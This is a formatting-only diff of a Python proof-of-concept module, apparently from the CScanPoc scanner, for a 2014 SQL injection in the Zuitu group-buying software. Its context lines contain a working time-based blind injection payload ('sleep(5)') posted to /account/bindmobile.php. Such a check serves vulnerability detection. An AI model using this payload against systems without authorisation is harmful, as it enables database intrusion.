@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Zuitu_0002' # 平台漏洞编号，留空
+    vuln_id = 'Zuitu_0002'  # 平台漏洞编号，留空
     name = '最土团购 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-07-23'  # 漏洞公布时间
     desc = '''
         最土团购，在include/library/DB.class.php(128-134):
@@ -40,7 +41,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/account/bindmobile.php'
             data_sleep = "userid=sssssssssssssssssssss',sleep(5))#"
             data_normal = "userid=sssssssssssssssssssss',1)#"
@@ -50,7 +51,7 @@ class Poc(ABPoc):
             time_end_normal = time.time()
             requests.post(url, data=data_sleep)
             time_end_sleep = time.time()
-            
+
             if (time_end_sleep-time_end_normal) - (time_end_normal-time_start) > 4:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -60,6 +61,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
